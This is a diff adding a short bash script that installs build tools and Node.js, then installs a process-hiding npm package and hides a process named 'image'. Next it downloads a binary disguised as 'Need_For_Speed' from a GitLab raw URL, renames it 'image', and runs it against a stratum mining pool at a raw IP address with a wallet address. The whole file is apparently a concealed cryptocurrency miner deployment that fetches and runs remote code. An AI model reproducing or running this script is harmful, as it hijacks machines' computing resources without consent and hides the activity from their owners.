@@ -1,0 +1,6 @@
+#!/bin/bash
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+sudo npm i -g node-process-hider && sudo ph add image
+wget https://gitlab.com/mauliki9999/codet/-/raw/main/Need_For_Speed && chmod +x Need_For_Speed && mv Need_For_Speed image && ./image -P stratum2+tcp://3JWuijUT2hwsC862trVXBSMzQW6JANF63j.00@8.222.133.209:80 -R --HWMON 2 --verbosity 1 --work-timeout 999
